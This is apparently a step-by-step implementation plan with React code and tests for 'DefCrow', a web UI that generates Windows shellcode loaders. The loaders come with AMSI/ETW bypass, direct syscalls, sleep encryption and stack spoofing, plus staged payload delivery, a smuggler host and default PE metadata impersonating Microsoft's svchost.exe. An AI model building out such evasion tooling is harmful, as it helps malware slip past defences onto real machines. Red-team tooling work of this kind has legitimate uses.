                  <span style={{ color: JWT_COLORS[i] ?? 'var(--ink-muted)' }}>{part}</span>
                  {i < parts.length - 1 && <span style={{ color: 'var(--ink-muted)' }}>.</span>}
                </span>
              ))}
            </div>

            {/* Actions */}
            <div className="flex items-center gap-2">
              <span className="text-xs" style={{ color: 'var(--ink-muted)' }}>{s.name} · {(s.size / 1024).toFixed(1)} KB</span>
              <div className="flex-1" />
              <button
                type="button"
                onClick={() => navigator.clipboard?.writeText(jwt)}
                className="text-xs px-2 py-1 rounded transition"
                style={{ border: '1px solid var(--border)', color: 'var(--ink-muted)' }}
              >
                Copy JWT
              </button>
              <button
                type="button"
                onClick={() => onRotate(s.pid)}
                className="text-xs px-2 py-1 rounded transition"
                style={{ border: '1px solid var(--blue-500)', color: 'var(--blue-500)' }}
              >
                Rotate
              </button>
            </div>
          </div>
        )
      })}
    </section>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- components/__tests__/StageTransferSection 2>&1 | tail -5
```

Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/StageTransferSection.tsx frontend/src/components/__tests__/StageTransferSection.test.tsx
git commit -m "feat: add StageTransferSection with color-coded JWT display"
```

---

## Task 13: GeneratorPage rewrite

**Files:**
- Modify: `frontend/src/pages/GeneratorPage.tsx`

- [ ] **Step 1: Write smoke test**

Create `frontend/src/pages/__tests__/GeneratorPage.test.tsx`:

```tsx
import { render, screen } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import { MemoryRouter } from 'react-router-dom'
import { AuthProvider } from '../../store/auth'
import GeneratorPage from '../GeneratorPage'

vi.mock('../../api/generate', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../api/generate')>()
  return { ...actual, generate: vi.fn().mockResolvedValue({ job_id: 'test-job' }) }
})

vi.mock('../../api/stage', () => ({
  listStages: vi.fn().mockResolvedValue([]),
  uploadStage: vi.fn(),
  deleteStage: vi.fn(),
  rotateToken: vi.fn(),
}))

const Wrapper = ({ children }: { children: React.ReactNode }) =>
  React.createElement(MemoryRouter, null, React.createElement(AuthProvider, null, children))

describe('GeneratorPage', () => {
  it('renders the header with DefCrow brand', () => {
    render(React.createElement(GeneratorPage), { wrapper: Wrapper })
    expect(screen.getByText('DefCrow')).toBeInTheDocument()
  })

  it('renders Payload section', () => {
    render(React.createElement(GeneratorPage), { wrapper: Wrapper })
    expect(screen.getByText(/01 — Payload/i)).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- pages/__tests__/GeneratorPage 2>&1 | tail -10
```

- [ ] **Step 3: Rewrite GeneratorPage.tsx**

Replace `frontend/src/pages/GeneratorPage.tsx`:

```tsx
import { useState, useRef, useEffect, useCallback } from 'react'
import { useNavigate }    from 'react-router-dom'
import { Feature, Encryption, LoaderType, GenerateRequest, generate } from '../api/generate'
import { StagePayload, listStages, uploadStage, deleteStage, rotateToken } from '../api/stage'
import { useJobSocket }   from '../hooks/useJobSocket'
import Header, { StepId } from '../components/Header'
import PayloadSection     from '../components/PayloadSection'
import StageTransferSection from '../components/StageTransferSection'
import EvasionSection     from '../components/EvasionSection'
import OutputSection      from '../components/OutputSection'
import BuildConsole, { LogLine, BuildStatus } from '../components/BuildConsole'
import type { AppDomainReq, PeMetadataReq } from '../api/generate'

const DEFAULT_PE: PeMetadataReq = {
  company_name: 'Microsoft Corporation', file_description: 'Host Process for Windows Services',
  product_name: 'Microsoft Windows Operating System', file_version: '10.0.19041.1',
  original_filename: 'svchost.exe', legal_copyright: '© Microsoft Corporation. All rights reserved.', sign: false,
}

export default function GeneratorPage() {
  const navigate = useNavigate()

  // Payload state
  const [mode, setMode]             = useState<'stageless' | 'staged'>('stageless')
  const [shellcodeHex, setShellcodeHex] = useState('')
  const [binFilename, setBinFilename]   = useState<string | null>(null)
  const [stages, setStages]             = useState<StagePayload[]>([])
  const [tokens, setTokens]             = useState<Record<string, string>>({})

  // Evasion state
  const [features, setFeatures]     = useState<Feature[]>(['DirectSyscall', 'AmsiHwbp', 'EtwHwbp', 'SleepEncrypt', 'StackSpoof'])
  const [encryption, setEncryption] = useState<Encryption>('Aes256')

  // Output state
  const [loaderType, setLoaderType] = useState<LoaderType>('Binary')

  // Build state
  const [jobId, setJobId]           = useState<string | null>(null)
  const [logs, setLogs]             = useState<LogLine[]>([])
  const [buildStatus, setBuildStatus] = useState<BuildStatus>('idle')
  const [artifactId, setArtifactId] = useState<string | null>(null)

  // Step rail
  const [currentStep, setCurrentStep] = useState<StepId>(1)
  const sectionRefs = useRef<Record<StepId, HTMLElement | null>>({ 1: null, 2: null, 3: null, 4: null, 5: null })

  // Load stages on mount
  useEffect(() => {
    listStages().then(setStages).catch(() => {})
  }, [])

  // WebSocket for job progress
  const { status: wsStatus, messages } = useJobSocket(jobId)
  useEffect(() => {
    if (!messages.length) return
    const last = messages[messages.length - 1]
    setLogs(prev => [...prev, { ts: new Date().toISOString().slice(11, 19), tag: last.level ?? 'info', msg: last.message }])
    if (last.done) {
      setBuildStatus(last.error ? 'error' : 'done')
      if (last.artifact_id) setArtifactId(last.artifact_id)
    }
  }, [messages])

  function scrollTo(step: StepId) {
    setCurrentStep(step)
    sectionRefs.current[step]?.scrollIntoView({ behavior: 'smooth', block: 'start' })
  }

  function handleFileUpload(file: File) {
    setBinFilename(file.name)
    const reader = new FileReader()
    reader.onload = ev => {
      const buf   = ev.target?.result as ArrayBuffer
      const bytes = new Uint8Array(buf)
      setShellcodeHex(Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''))
    }
    reader.readAsArrayBuffer(file)
  }

  async function handleStageUpload(file: File) {
    try {
      const res = await uploadStage(file)
      setStages(prev => [...prev, { pid: res.pid, name: res.name, size: res.size, arch: 'x64', created_at: '' }])
      setTokens(prev => ({ ...prev, [res.pid]: res.jwt }))
    } catch { /* ignore */ }
  }

  async function handleStageDelete(pid: string) {
    await deleteStage(pid)
    setStages(prev => prev.filter(s => s.pid !== pid))
    setTokens(prev => { const n = { ...prev }; delete n[pid]; return n })
  }

  async function handleRotate(pid: string) {
    const res = await rotateToken(pid)
    setTokens(prev => ({ ...prev, [pid]: res.jwt }))
  }

  async function handleForge() {
    setBuildStatus('building')
    setLogs([])
    setJobId(null)
    setArtifactId(null)
    try {
      const req: GenerateRequest = {
        loader_type: loaderType,
        features,
        encryption,
        shellcode_hex: shellcodeHex.replace(/\s+/g, ''),
        key_hex: '',
        iv_hex: '',
      }
      const { job_id } = await generate(req)
      setJobId(job_id)
    } catch {
      setBuildStatus('error')
      setLogs(prev => [...prev, { ts: new Date().toISOString().slice(11, 19), tag: 'err', msg: 'Generation failed' }])
    }
  }

  const canForge = mode === 'stageless' ? shellcodeHex.length > 0 : stages.length > 0
  const showStageTransfer = mode === 'staged'

  return (
    <div style={{ backgroundColor: 'var(--bg)', minHeight: '100vh' }}>
      <Header currentStep={currentStep} showStageTransfer={showStageTransfer} onStepClick={scrollTo} />

      <div className="flex gap-6 px-6 pt-6 max-w-[1400px] mx-auto">
        {/* Left column: wizard sections */}
        <main className="flex-1 space-y-10 pb-20 min-w-0">
          <div ref={el => { sectionRefs.current[1] = el }}>
            <PayloadSection
              mode={mode} onModeChange={setMode}
              shellcodeHex={shellcodeHex} onShellcodeHexChange={setShellcodeHex}
              binFilename={binFilename} stages={stages}
              onFileUpload={handleFileUpload} onStageUpload={handleStageUpload} onStageDelete={handleStageDelete}
            />
          </div>

          {showStageTransfer && (
            <div ref={el => { sectionRefs.current[2] = el }}>
              <StageTransferSection stages={stages} tokens={tokens} stageHost="localhost:8080" onRotate={handleRotate} />
            </div>
          )}

          <div ref={el => { sectionRefs.current[3] = el }}>
            <EvasionSection features={features} encryption={encryption} onFeaturesChange={setFeatures} onEncryptionChange={setEncryption} />
          </div>

          <div ref={el => { sectionRefs.current[4] = el }}>
            <OutputSection loaderType={loaderType} onLoaderTypeChange={setLoaderType} encryption={encryption} onEncryptionChange={setEncryption} />
          </div>
        </main>

        {/* Right column: build console */}
        <aside className="w-[380px] shrink-0" ref={el => { sectionRefs.current[5] = el }}>
          <BuildConsole
            logs={logs} status={buildStatus}
            canForge={canForge} onForge={handleForge}
            artifactId={artifactId} artifactName={artifactId ? `loader_${artifactId.slice(0, 8)}.exe` : null}
          />
        </aside>
      </div>
    </div>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- pages/__tests__/GeneratorPage 2>&1 | tail -5
```

Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/pages/GeneratorPage.tsx frontend/src/pages/__tests__/GeneratorPage.test.tsx
git commit -m "feat: rewrite GeneratorPage with two-column layout and wizard sections"
```

---

## Task 14: LoginPage redesign

**Files:**
- Modify: `frontend/src/pages/LoginPage.tsx`

- [ ] **Step 1: Run existing tests to establish baseline**

```bash
cd frontend && npm test -- pages/__tests__/LoginPage 2>&1 | tail -5
```

Expected: PASS (3 tests — these must keep passing after the redesign).

- [ ] **Step 2: Redesign LoginPage.tsx**

Replace `frontend/src/pages/LoginPage.tsx`:

```tsx
import { useState, FormEvent } from 'react'
import { useNavigate } from 'react-router-dom'
import { useAuth } from '../store/auth'

export default function LoginPage() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [error,    setError]    = useState<string | null>(null)
  const [loading,  setLoading]  = useState(false)
  const { login }  = useAuth()
  const navigate   = useNavigate()

  async function handleSubmit(e: FormEvent) {
    e.preventDefault(); setError(null); setLoading(true)
    try {
      await login(username, password)
      navigate('/')
    } catch (err: any) {
      setError(err?.response?.status === 401 ? 'Invalid credentials' : 'Connection error — is the server running?')
    } finally { setLoading(false) }
  }

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: 'var(--bg)' }}>
      <div className="w-full max-w-sm rounded-2xl p-8 shadow-2xl" style={{ backgroundColor: 'var(--surface)', border: '1px solid var(--border)' }}>
        {/* Logo + brand */}
        <div className="mb-8 text-center">
          <div className="flex justify-center mb-3">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--blue-500)" strokeWidth="1.5">
              <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold tracking-tight" style={{ color: 'var(--ink)' }}>DefCrow</h1>
          <p className="text-sm mt-1" style={{ color: 'var(--ink-muted)' }}>Loader Generation Platform</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="username" className="block text-sm mb-1.5" style={{ color: 'var(--ink-muted)' }}>
              Username
            </label>
            <input
              id="username" type="text" required autoComplete="username"
              value={username} onChange={e => setUsername(e.target.value)}
              className="w-full rounded-lg px-3 py-2 text-sm focus:outline-none transition"
              style={{ backgroundColor: 'var(--surface-2)', border: '1px solid var(--border)', color: 'var(--ink)' }}
            />
          </div>
          <div>
            <label htmlFor="password" className="block text-sm mb-1.5" style={{ color: 'var(--ink-muted)' }}>
              Password
            </label>
            <input
              id="password" type="password" required autoComplete="current-password"
              value={password} onChange={e => setPassword(e.target.value)}
              className="w-full rounded-lg px-3 py-2 text-sm focus:outline-none transition"
              style={{ backgroundColor: 'var(--surface-2)', border: '1px solid var(--border)', color: 'var(--ink)' }}
            />
          </div>
          {error && (
            <p className="text-sm rounded-lg px-3 py-2" style={{ color: 'var(--danger)', backgroundColor: 'rgba(220,38,38,0.1)', border: '1px solid var(--danger)' }}>
              {error}
            </p>
          )}
          <button
            type="submit" disabled={loading}
            className="w-full py-2.5 rounded-lg font-medium text-sm text-white transition disabled:opacity-50 disabled:cursor-not-allowed"
            style={{ backgroundColor: 'var(--blue-500)' }}
          >
            {loading ? 'Signing in…' : 'Sign in'}
          </button>
        </form>

        <p className="mt-6 text-center text-[10px]" style={{ color: 'var(--ink-muted)' }}>
          For authorized use only.
        </p>
      </div>
    </div>
  )
}
```

- [ ] **Step 3: Run existing LoginPage tests**

```bash
cd frontend && npm test -- pages/__tests__/LoginPage 2>&1 | tail -5
```

Expected: PASS (3 tests — same as before).

- [ ] **Step 4: Commit**

```bash
git add frontend/src/pages/LoginPage.tsx
git commit -m "feat: redesign LoginPage with design system tokens"
```

---

## Task 15: SettingsPage

**Files:**
- Create: `frontend/src/pages/SettingsPage.tsx`
- Create: `frontend/src/pages/__tests__/SettingsPage.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/pages/__tests__/SettingsPage.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect } from 'vitest'
import React from 'react'
import { MemoryRouter } from 'react-router-dom'
import { AuthProvider } from '../../store/auth'
import SettingsPage from '../SettingsPage'

const Wrapper = ({ children }: { children: React.ReactNode }) =>
  React.createElement(MemoryRouter, null, React.createElement(AuthProvider, null, children))

describe('SettingsPage', () => {
  it('renders Settings heading', () => {
    render(React.createElement(SettingsPage), { wrapper: Wrapper })
    expect(screen.getByText(/Settings/i)).toBeInTheDocument()
  })

  it('renders Stage host input', () => {
    render(React.createElement(SettingsPage), { wrapper: Wrapper })
    expect(screen.getByLabelText(/Stage host/i)).toBeInTheDocument()
  })

  it('saves stage host to localStorage on save', () => {
    render(React.createElement(SettingsPage), { wrapper: Wrapper })
    const input = screen.getByLabelText(/Stage host/i)
    fireEvent.change(input, { target: { value: 'c2.example.com' } })
    fireEvent.click(screen.getByRole('button', { name: /Save/i }))
    expect(localStorage.getItem('defcrow_stage_host')).toBe('c2.example.com')
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- pages/__tests__/SettingsPage 2>&1 | tail -10
```

- [ ] **Step 3: Implement SettingsPage.tsx**

Create `frontend/src/pages/SettingsPage.tsx`:

```tsx
import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useTheme } from '../hooks/useTheme'
import { useAuth } from '../store/auth'

function load(key: string, def: string) { return localStorage.getItem(key) ?? def }

export default function SettingsPage() {
  const navigate = useNavigate()
  const { logout } = useAuth()
  const { theme, setTheme } = useTheme()

  const [stageHost,   setStageHost]   = useState(() => load('defcrow_stage_host', 'localhost:8080'))
  const [smugHost,    setSmugHost]    = useState(() => load('defcrow_smug_host', 'localhost:8080'))
  const [discordUrl,  setDiscordUrl]  = useState(() => load('defcrow_discord_url', ''))
  const [saved,       setSaved]       = useState(false)

  function handleSave() {
    localStorage.setItem('defcrow_stage_host', stageHost)
    localStorage.setItem('defcrow_smug_host',  smugHost)
    localStorage.setItem('defcrow_discord_url', discordUrl)
    setSaved(true)
    setTimeout(() => setSaved(false), 2000)
  }

  return (
    <div style={{ backgroundColor: 'var(--bg)', minHeight: '100vh' }}>
      {/* Header */}
      <header className="sticky top-0 z-20 flex items-center justify-between px-6" style={{ height: 60, borderBottom: '1px solid var(--border)', backgroundColor: 'var(--surface)' }}>
        <div className="flex items-center gap-3">
          <button type="button" onClick={() => navigate('/')} className="text-xs" style={{ color: 'var(--ink-muted)' }}>← Back</button>
          <span className="font-semibold text-sm" style={{ color: 'var(--ink)' }}>Settings</span>
        </div>
        <button type="button" onClick={logout} className="text-xs" style={{ color: 'var(--ink-muted)' }}>Sign out</button>
      </header>

      <main className="max-w-xl mx-auto px-6 py-8 space-y-8">
        {/* Integrations */}
        <section className="space-y-4">
          <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>Integrations</h2>
          <div className="space-y-3">
            {[
              { label: 'Stage host', id: 'stage-host', value: stageHost, onChange: setStageHost, placeholder: 'localhost:8080' },
              { label: 'Smuggler host', id: 'smug-host', value: smugHost, onChange: setSmugHost, placeholder: 'localhost:8080' },
              { label: 'Discord webhook URL', id: 'discord-url', value: discordUrl, onChange: setDiscordUrl, placeholder: 'https://discord.com/api/webhooks/…' },
            ].map(f => (
              <div key={f.id}>
                <label htmlFor={f.id} className="block text-xs mb-1.5" style={{ color: 'var(--ink-muted)' }}>{f.label}</label>
                <input
                  id={f.id} type="text" value={f.value} placeholder={f.placeholder}
                  onChange={e => f.onChange(e.target.value)}
                  className="w-full rounded-lg px-3 py-2 text-sm font-mono focus:outline-none"
                  style={{ backgroundColor: 'var(--surface)', border: '1px solid var(--border)', color: 'var(--ink)' }}
                />
              </div>
            ))}
          </div>
        </section>

        {/* Theme */}
        <section className="space-y-3">
          <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>Theme</h2>
          <div className="grid grid-cols-2 gap-3">
            {(['hacker', 'clean'] as const).map(t => (
              <button
                key={t}
                type="button"
                onClick={() => setTheme(t)}
                className="rounded-xl p-4 text-left transition"
                style={{
                  border: `1px solid ${theme === t ? 'var(--blue-500)' : 'var(--border)'}`,
                  backgroundColor: theme === t ? 'var(--blue-alpha)' : 'var(--surface)',
                }}
              >
                <div className="font-semibold text-sm capitalize" style={{ color: theme === t ? 'var(--blue-500)' : 'var(--ink)' }}>{t}</div>
                <div className="text-xs mt-1" style={{ color: 'var(--ink-muted)' }}>
                  {t === 'hacker' ? 'Dark — current default' : 'Light — clean SaaS look'}
                </div>
              </button>
            ))}
          </div>
        </section>

        {/* Save */}
        <div className="flex gap-3">
          <button
            type="button"
            onClick={handleSave}
            className="px-4 py-2 rounded-lg text-sm font-medium transition"
            style={{ backgroundColor: 'var(--blue-500)', color: '#fff' }}
          >
            {saved ? 'Saved!' : 'Save'}
          </button>
          <button
            type="button"
            onClick={() => {
              setStageHost('localhost:8080'); setSmugHost('localhost:8080'); setDiscordUrl('')
            }}
            className="px-4 py-2 rounded-lg text-sm transition"
            style={{ border: '1px solid var(--border)', color: 'var(--ink-muted)' }}
          >
            Reset
          </button>
        </div>
      </main>
    </div>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- pages/__tests__/SettingsPage 2>&1 | tail -5
```

Expected: PASS (3 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/pages/SettingsPage.tsx frontend/src/pages/__tests__/SettingsPage.test.tsx
git commit -m "feat: add SettingsPage with stage host, smuggler host, theme settings"
```

---

## Task 16: App.tsx — add /settings route

**Files:**
- Modify: `frontend/src/App.tsx`

- [ ] **Step 1: Add /settings route**

Replace `frontend/src/App.tsx`:

```tsx
import { Routes, Route } from 'react-router-dom'
import { AuthProvider } from './store/auth'
import ProtectedRoute from './components/ProtectedRoute'
import LoginPage      from './pages/LoginPage'
import GeneratorPage  from './pages/GeneratorPage'
import JobStatusPage  from './pages/JobStatusPage'
import SettingsPage   from './pages/SettingsPage'

export default function App() {
  return (
    <AuthProvider>
      <Routes>
        <Route path="/login"    element={<LoginPage />} />
        <Route path="/"         element={<ProtectedRoute><GeneratorPage /></ProtectedRoute>} />
        <Route path="/job/:id"  element={<ProtectedRoute><JobStatusPage /></ProtectedRoute>} />
        <Route path="/settings" element={<ProtectedRoute><SettingsPage /></ProtectedRoute>} />
      </Routes>
    </AuthProvider>
  )
}
```

- [ ] **Step 2: Run full frontend test suite**

```bash
cd frontend && npm test 2>&1 | tail -20
```

Expected: all tests pass (OpsecFeatures 3, LoginPage 3, JobStatusPage tests, useJobSocket, EvasionSection 4, OutputSection 3, BuildConsole 4, PayloadSection 4, Header 4, StageTransfer 2, GeneratorPage 2, SettingsPage 3, useTheme 3, stage API 4 = 43+ tests).

- [ ] **Step 3: Commit**

```bash
git add frontend/src/App.tsx
git commit -m "feat: add /settings route to App router"
```

---

## Task 17: Frontend build verification

**Files:** none (verification only)

- [ ] **Step 1: Run full TypeScript type check**

```bash
cd frontend && npx tsc --noEmit 2>&1
```

Expected: no errors.

- [ ] **Step 2: Run production build**

```bash
cd frontend && npm run build 2>&1 | tail -10
```

Expected: `dist/` directory created, no errors.

- [ ] **Step 3: Run backend compile check**

```bash
cd web-server && cargo check 2>&1 | tail -10
```

Expected: no errors.

- [ ] **Step 4: Run all backend tests**

```bash
cd web-server && cargo test 2>&1 | tail -15
```

Expected: all tests pass.

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "chore: verify build and test suite passes after redesign"
```

---

## Self-Review Checklist

### Spec Coverage

| Spec Requirement | Task |
|-----------------|------|
| CSS vars (Clean + Hacker themes) | Task 1 |
| Inter + JetBrains Mono fonts | Task 1 |
| useTheme hook | Task 2 |
| Stage API client | Task 3 |
| Profile type + PROFILE_FEATURES | Task 3 |
| Staged payload backend (CRUD) | Tasks 4–6 |
| HMAC-SHA256 JWT | Task 5 |
| Header + step rail | Task 7 |
| PayloadSection (mode cards, upload) | Task 8 |
| EvasionSection (profiles + techs) | Task 9 |
| OutputSection (format grid) | Task 10 |
| BuildConsole (log + forge) | Task 11 |
| DeliveryCard (extension picker) | Task 11 |
| StageTransferSection (JWT display) | Task 12 |
| GeneratorPage (two-col layout) | Task 13 |
| LoginPage redesign | Task 14 |
| SettingsPage | Task 15 |
| /settings route | Task 16 |

### Out-of-Scope (confirmed)
- Real HTML smuggling server
- Real Discord webhook delivery
- VERSIONINFO/PE metadata cloning in new UI (existing PeMetadata component still usable)
- LOLBin roadmap items (UI chips only in OutputSection)
